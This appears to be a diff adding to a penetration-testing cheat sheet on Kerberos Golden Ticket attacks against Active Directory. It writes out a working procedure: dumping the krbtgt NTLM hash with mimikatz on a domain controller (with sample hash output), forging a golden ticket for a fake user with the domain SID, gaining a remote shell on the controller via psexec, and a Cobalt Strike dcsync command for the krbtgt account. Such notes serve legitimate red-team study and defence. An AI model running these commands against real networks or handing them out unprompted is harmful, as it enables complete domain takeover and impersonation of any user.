@@ -15,7 +15,35 @@ ___
 
 ## Description:  
 
+Need krbtgt password hash, which usually requires domain admin to obtain.
+
 A Golden Ticket is a forged TGT, signed by the domain's krbtgt account. Whereas a Silver Ticket can be used to impersonate any user, it's limited to either that single service or to any service but on a single machine. A Golden Ticket can be used to impersonate any user, to any service, on any machine in the domain; and to add insult to injury - the underlying credentials are never changed automatically. For that reason, the `krbtgt` NTLM/AES is probably the single most powerful secret you can obtain (and is why you see it used in dcsync examples so frequently).
+
+### In mimikatz
+Dump hashes on the domain controller and look for krbtgt password hash.
+```
+mimikatz # lsadump::lsa /patch
+...
+RID : 000001f6 (502)
+User : krbtgt
+LM :
+NTLM : 75b60230a2394a812000dbfad8415965
+...
+```
+Now make the Golden ticket
+```
+mimikatz # kerberos::purge
+Ticket(s) purge for current session is OK
+
+mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+
+mimikatz # misc::cmd
+
+C:\Users\offsec.crop> psexec.exe \\dc01 cmd.exe
+
+```
+
+### In CobaltStrike
 
 ```
 beacon> dcsync dev.cyberbotic.io DEV\krbtgt
